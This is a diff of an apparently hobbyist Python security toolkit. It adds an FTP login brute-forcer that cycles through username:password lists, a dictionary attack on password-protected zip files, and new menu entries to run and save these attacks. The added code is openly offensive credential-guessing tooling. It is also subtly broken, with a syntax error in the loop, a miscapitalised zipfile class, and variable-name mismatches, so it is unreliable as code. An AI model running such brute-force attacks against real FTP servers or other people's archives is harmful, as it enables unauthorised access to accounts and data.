@@ -4,6 +4,45 @@ import sys
 import ftplib
 import os
 from winreg import *
+import zipfile
+
+def bruteForceLogin(hostname, passwordFile):
+    passList = open(passwordFile, 'r')
+    for line in passList.readlines():
+        #Format the passlist as username:password with each separated only by new lines
+        username = line.split(':')[0]
+        password = line.split(':')[1].strip('\r').strip('\n')
+        print('[+] Trying: ' + str(username) + "/" + str(password))
+        try:
+            ftp = ftplib.FTP(hostname)
+            ftp.login(username, password)
+            print("FTP Login Succeeded: " + str(username) + "/" + str(password))
+            ftp.quit()
+            return(str(username) + ":" + str(password))
+        except Exception:
+            pass
+    print("Either you could not connect, or the username and pasword combo was not in the list")
+    return("Either you could not connect, or the username and pasword combo was not in the list")
+
+def extractFile(zFile, password):
+    try:
+        zfile.extractall(pwd=bytes(password, 'utf-8'))
+        return password
+    except:
+        return
+
+def dictZipAttack(zipfilename, dictPassList):
+    zfile = zipfile.Zipfile(zipfilename)
+    passFile = open(dictPassList)
+    for line passFile.readlines():
+        #Format the password list as unique passwords on each line
+        password = line.strip('\n')
+        guess = extractFile(zfile, password)
+        if guess:
+            print("Success! The password is: " + password)
+            return("Success! The password is: " + password)
+    print("Sorry, but it would appear that your dictionary does not contain the password")
+    return("Sorry, but it would appear that your dictionary does not contain the password")
 
 def anonLogin(hostname):
     printList = []
@@ -12,8 +51,8 @@ def anonLogin(hostname):
         print("[+] Resolved hostname: Success!")
         printList.append("[+] Resolved hostname: Success!")
     except:
-        print("[-] Cannot resolve %s"% tgtHost)
-        printList.append("[-] Cannot resolve %s"% tgtHost)
+        print("[-] Cannot resolve %s"% hostname)
+        printList.append("[-] Cannot resolve %s"% hostname)
         return printList
     try:
         ftp = ftplib.FTP(tgtIP)
@@ -91,7 +130,7 @@ def printFile(printList):
         portLogFileName = input("Choose a name for this file, or use the name of an existing log file - ")
         portLogFileName += ".txt"
         fout = open(portLogFileName, "a+")
-        logName = input("\nAssign a name to this Site log, or press enter to skip - ")
+        logName = input("\nAssign a name to this log, or press enter to skip - ")
         if len(logName) != 0:
             fileInsert = logName + " - " + xDate + "\n"
         else:
@@ -135,7 +174,7 @@ def findRecycled(recycleDir):
 def main():
     today = date.today()
     xDate = today.strftime("%m/%d/%y")
-    optionsList = ['What would you like to do?', '[1] Make a scan', '[2] Save the results of previous port scan', '[3] FTP-Anon-Scan', '[4] Save the results of previous FTP scan', '[5] Check for deleted files', '[6] Save Deleted Files', '[7] Exit']
+    optionsList = ['What would you like to do?', '[1] Make a scan', '[2] Save the results of previous port scan', '[3] FTP-Anon-Scan', '[4] Save the results of previous FTP scan', '[5] Check for deleted files', '[6] Save Deleted Files', '[7] Show additional options']
     while 1:
         formatMenu(optionsList)
         choice = getUserChoice(formatMenuPrompt())
@@ -189,11 +228,46 @@ def main():
             delList = findRecycled(recycledDir)
         elif choice == "6":
             try:
-                for i in delList:
-                    print(i)
+                printFile(delList)
+                delList = []
             except:
                 print("\nI am sorry, Please run a delete scan first!")
         elif choice == "7":
+            optionsList = ['What would you like to do?', '[8] Zip-File Dictionary-Attack', '[9] Save the results of the Zip-File Dictionary-Attack', '[10] FTP Dictionary Attack', '[11] Save the results of the FTP attack', '[12] Show previous menu', '[13] Exit']
+        elif choice == "8":
+            zipfilename = getUserChoice("What is the name of the zipfile? (Do not include the extension) ")
+            zipfilename += ".zip"
+            dictPassList = getUserChoice("What is the name of the Dictionary List? (Do not include the extension) ")
+            dictPassList += ".txt"
+            try:
+                zipResult = []
+                zipResult.append(dictZipAttack(zipfilename, dictPassList))
+            except:
+                print("Sorry, either your dictionary file is not in a .txt, your locked file is not a .zip, or you have a typo in there. Please try again!")
+        elif choice == "9":
+            try:
+                printFile(zipResult)
+                zipResult = []
+            except:
+                print("Sorry, you must run a Dictionary Zip attack first")
+        elif choice == "10":
+            hostname = getUserChoice("What is the hostname of the FTP service? ")
+            dictLoginList = getUserChoice("What is the name of the FTP Login List? (Do not include the extension) ")
+            dictLoginList += ".txt"
+            try:
+                ftpDAResult = []
+                ftpDAResult.append(bruteForceLogin(hostname, dictLoginList))
+            except:
+                print("Sorry, either the hostname failed to resolve, or the ftp login list could not be found")
+        elif choice == "11":
+            try:
+                printFile(ftpDAResult)
+                ftpDAResult = []
+            except:
+                print("Sorry, you must run a Dictionary FTP service attack first")
+        elif choice == "12":
+            optionsList = ['What would you like to do?', '[1] Make a scan', '[2] Save the results of previous port scan', '[3] FTP-Anon-Scan', '[4] Save the results of previous FTP scan', '[5] Check for deleted files', '[6] Save Deleted Files', '[7] Exit']
+        elif choice == "13":
             sys.exit( 0 )
         else:
             print("Invalid choice, please try again")
